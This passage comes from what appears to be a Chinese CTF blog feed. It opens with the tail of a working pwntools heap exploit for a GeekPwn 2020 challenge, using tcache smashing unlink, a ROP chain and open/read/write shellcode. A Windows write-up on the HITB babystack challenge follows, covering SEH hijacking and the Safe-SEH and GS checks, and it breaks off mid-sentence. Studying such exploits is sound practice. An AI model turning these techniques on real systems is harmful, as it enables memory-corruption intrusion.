punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xf0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xb1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_addr<span class="token operator">-</span>heap_static<span class="token operator">+</span><span class="token number">0x000055555555c590</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000100000</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># -------- tcache smashing unlink attack modify global_max_fast ---------</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x180</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xc0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x1a0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token operator">*</span><span class="token number">0xe0</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xc1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_addr<span class="token operator">-</span>heap_static<span class="token operator">+</span><span class="token number">0x000055555555d9b0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7ffff7fb5600</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token operator">-</span>static_libc<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># --------- prepare chunk for hijacking top chunk -------------</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># tcache smashing unlink to modify  </span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># delete 0xd0 size chunk, this chunk addr will cover top chunkaddr</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x100000</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># modify 0x130 fast chunnk fd = 0</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#clear fastbin 0x130 list</span><span class="token comment" spellcheck="true"># backdoor execute puts(environ)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address <span class="token operator">-</span> static_libc <span class="token operator">+</span> <span class="token number">0x7ffff7fb5d60</span><span class="token punctuation">)</span><span class="token punctuation">)</span> backdoor<span class="token punctuation">(</span><span class="token punctuation">)</span>stack_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7fffffffe038</span><span class="token operator">+</span><span class="token number">0x7fffffffdf28</span>success<span class="token punctuation">(</span><span class="token string">"stack address ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># backdoor execute gets(ret stack addr) and call [0x100000+0x140]</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    pop_rax <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span>    pop_rdi <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000026542</span>    pop_rsi <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000026f9e</span>    pop_rdx <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x000000000012bda6</span>    syscall <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span>    pop_rax_call_rax <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x000000000014f404</span><span class="token keyword">else</span><span class="token punctuation">:</span>    pop_rax <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span>    pop_rdi <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000026542</span>    pop_rsi <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x0000000000026f9e</span>    pop_rdx <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x000000000012bda6</span>    syscall <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span>    pop_rax_call_rax <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> <span class="token number">0x000000000014f404</span>payload2 <span class="token operator">=</span> asm<span class="token punctuation">(</span><span class="token triple-quoted-string string">'''            mov rdi,0x100140            xor rsi,rsi            xor rdx,rdx            mov rax,2            syscall            mov rdi,rax            mov rsi,0x100200            mov rdx,0x40            mov rax,0            syscall            mov rdi,1            mov rsi,0x100200            mov rdx,0x40            mov rax,1            syscall            '''</span><span class="token punctuation">)</span>payload1 <span class="token operator">=</span> flat<span class="token punctuation">(</span><span class="token punctuation">[</span>pop_rdi<span class="token punctuation">,</span><span class="token number">0x100000</span><span class="token punctuation">,</span>pop_rsi<span class="token punctuation">,</span><span class="token number">0x1000</span><span class="token punctuation">,</span>pop_rdx<span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"mprotect"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>pop_rax_call_rax<span class="token punctuation">,</span><span class="token number">0x100000</span><span class="token operator">+</span><span class="token number">0x140</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"gets"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stack_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">,</span><span class="token string">"flag"</span><span class="token operator">+</span><span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>payload2<span class="token operator">+</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p.clean()</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>backdoor<span class="token punctuation">(</span><span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>sl<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2020 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> GeekPwn 2020 </tag>
            
            <tag> ORW </tag>
            
            <tag> 2.30 glibc </tag>
            
            <tag> tcache smashing unlink </tag>
            
            <tag> global_max_fast </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WinPwn入门之-HITB-Babystack</title>
      <link href="/2020/08/06/hitb-babystack/"/>
      <url>/2020/08/06/hitb-babystack/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>学习Windows Pwn的第二步，感觉不baby啊。</p><h1 id="0x01-查看文件"><a href="#0x01-查看文件" class="headerlink" title="0x01 查看文件"></a>0x01 查看文件</h1><p>利用<a href="https://gist.github.com/apogiatzis/fb617cd118a9882749b5cb167dae0c5d" target="_blank" rel="noopener">checksec</a>脚本查看保护机制</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/0.png"></div>后来发现更好的查看文件保护机制的方法：winchecksec<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/1.png"></div><p>我们看到DEP开启也就是说数据不可执行，地址随机化开启，GS开启，SEH保护开启</p><h1 id="0x02-IDA分析"><a href="#0x02-IDA分析" class="headerlink" title="0x02 IDA分析"></a>0x02 IDA分析</h1><p>首先看到主函数里面给了栈地址和程序加载基址，并且还有个栈溢出</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/2.png"></div>在前面的文章中我们知道了，windows下getshell使用命令system("cmd")又找到了后门函数，注意这里在F5下看不到，并且字符串搜索也没有<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/3.png"></div>由于题目开启了GS，那么就不能通过一般的溢出来修改EIP了。在main函数的一开始就注册了异常处理函数（当一个程序注册了异常处理函数，那么当函数运行时发生异常的时候会由该异常处理函数进行异常捕获和处理）<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/4.png"></div><h1 id="0x03-调试"><a href="#0x03-调试" class="headerlink" title="0x03 调试"></a>0x03 调试</h1><p>搞了好久，最后还是有点问题。静态调试用windbg，可以看到更为详细的异常处理部分。动态调试就IDA attach进程吧。从exp里面起调试器不管是gdb还是windbg都有问题，我服了。windbg挺好用的，有自己的执行命令，查看内存什么的都可以。就是没办法动调，贼烦，害。</p><p>最后动调的方式：利用win_server起一个端口，远程exp打过去，再windows10本地起windbg来attach上去调试。</p><p>我们利用windbg对babystack进行静态调试，令其读取0x0地址的内容，我调了一下午也没看出异常处理和main函数执行前压栈的那个SEH地址有什么关系。<br>由于eax我们赋值0，所以在这里找0地址的数据会出现异常</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/5.png"></div>至于后面的就不知道在干什么了，找了大量的exp看，这里也只是提了一下。<p>就快要放弃的时候，糊里糊涂的解决了这个问题，我们调试的时候断在压SEH函数的地方，找到该值0xaaaa，于是在这里下个断点bp 0xaaaa，再g下去，我们看到通过输入找0地址的命令后，会断在上面那条：<br>mov ecx dword ptr [eax]；处，此时再g下去，我们便可以断在SEH函数位置了</p><div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/6.png"></div>的确是去执行SEH函数了。但是我们通过溢出可以控制这个地址，那么我们能不能直接改为后门函数呢？貌似是不行的：首先我们成功的看到SEH函数地址改为我们溢出的内容了：<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/7.png"></div>改为0x31313131，那么我们看看继续g下去会不会执行到这个地址。<div style="width:80%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/08/06/hitb-babystack/8.png"></div>发现一直卡在这里，我们所指定的0x31313131地址的函数不能运行<h1 id="0x04-Safe-SEH绕过-amp-源码分析"><a href="#0x04-Safe-SEH绕过-amp-源码分析" class="headerlink" title="0x04 Safe-SEH绕过&amp;源码分析"></a>0x04 Safe-SEH绕过&amp;源码分析</h1><p>这是由于Safe-SEH的开启，导致不在__safe_se_handler_table的SEH都不能运行，也就是说无法直接劫持异常捕获函数来getshell（为什么上面的safeSEH是关闭的呢。。。）</p><p>_except_handler4_common：</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">_except_handler4_common</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>securityCookies<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>cookieCheckFunction<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _EXCEPTION_RECORD <span class="token operator">*</span>exceptionRecord<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int32 sehFrame<span class="token punctuation">,</span> _CONTEXT <span class="token operator">*</span>context<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 异或解密 scope table</span>    scopeTable_1 <span class="token operator">=</span> <span class="token punctuation">(</span>_EH4_SCOPETABLE <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">*</span>securityCookies <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>sehFrame <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// sehFrame 等于 上图 ebp - 10h 位置, framePointer 等于上图 ebp 的位置</span>    framePointer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>sehFrame <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    scopeTable <span class="token operator">=</span> scopeTable_1<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// 验证 GS</span>    <span class="token function">ValidateLocalCookies</span><span class="token punctuation">(</span>cookieCheckFunction<span class="token punctuation">,</span> scopeTable_1<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>sehFrame <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">__except_validate_context_record</span><span class="token punctuation">(</span>context<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> exceptionRecord<span class="token operator">-></span>ExceptionFlags <span class="token operator">&amp;</span> <span class="token number">0x66</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>        exceptionPointers<span class="token punctuation">.</span>ExceptionRecord <span class="token operator">=</span> exceptionRecord<span class="token punctuation">;</span>        exceptionPointers<span class="token punctuation">.</span>ContextRecord <span class="token operator">=</span> context<span class="token punctuation">;</span>        tryLevel <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>sehFrame <span class="token operator">+</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>sehFrame <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span>exceptionPointers<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> tryLevel <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token punctuation">{</span>                v8 <span class="token operator">=</span> tryLevel <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>tryLevel <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                filterFunc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">,</span> _DWORD<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>scopeTable_1<span class="token operator">-></span>GSCookieXOROffset <span class="token operator">+</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>                scopeTableRecord <span class="token operator">=</span> <span class="token punctuation">(</span>_EH4_SCOPETABLE_RECORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>scopeTable_1 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> v8<span class="token punctuation">)</span><span class="token punctuation">;</span>                encloseingLevel <span class="token operator">=</span> scopeTableRecord<span class="token operator">-></span>EnclosingLevel<span class="token punctuation">;</span>                scopeTableRecord_1 <span class="token operator">=</span> scopeTableRecord<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> filterFunc <span class="token punctuation">)</span>                <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// 调用 FilterFunc</span>                    filterFuncRet <span class="token operator">=</span> <span class="token function">_EH4_CallFilterFunc</span><span class="token punctuation">(</span>filterFunc<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span> filterFuncRet <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span>                    <span class="token punctuation">{</span>                        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                        <span class="token comment" spellcheck="true">// 调用 HandlerFunc</span>                        <span class="token function">_EH4_TransferToHandler</span><span class="token punctuation">(</span>scopeTableRecord_1<span class="token operator">-></span>HandlerFunc<span class="token punctuation">,</span> v5 <span class="token operator">+</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span>                <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>                tryLevel <span class="token operator">=</span> encloseingLevel<span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> encloseingLevel <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">)</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                scopeTable_1 <span class="token operator">=</span> scopeTable<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ValidateLocalCookies:</p><pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">ValidateLocalCookies</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span>cookieCheckFunction<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">,</span> _EH4_SCOPETABLE <span class="token operator">*</span>scopeTable<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>framePointer<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// esi@2</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// esi@3</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> scopeTable<span class="token operator">-></span>GSCookieOffset <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>        v3 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>framePointer<span class="token punctuation">[</span>scopeTable<span class="token operator">-></span>GSCookieOffset<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>framePointer<span class="token punctuation">[</span>scopeTable<span class="token operator">-></span>GSCookieXOROffset<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">__guard_check_icall_fptr</span><span class="token punctuation">(</span>cookieCheckFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__thiscall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span><span class="token punctuation">)</span>cookieCheckFunction<span class="token punctuation">)</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    v4 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>framePointer<span class="token punctuation">[</span>scopeTable<span class="token operator">-></span>EHCookieOffset<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>framePointer<span class="token punctuation">[</span>scopeTable<span class="token operator">-></span>EHCookieXOROffset<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">__guard_check_icall_fptr</span><span class="token punctuation">(</span>cookieCheckFunction<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__thiscall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span><span class="token punctuation">)</span>cookieCheckFunction<span class="token punctuation">)</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>函数大概做了这些事情：<br>1.利用securityCookies 异或 (sehFrame + 8) 得到scopeTable_1，再得到scopeTable<br>2.根据栈得到framePointer</p><p>调用到了 scope 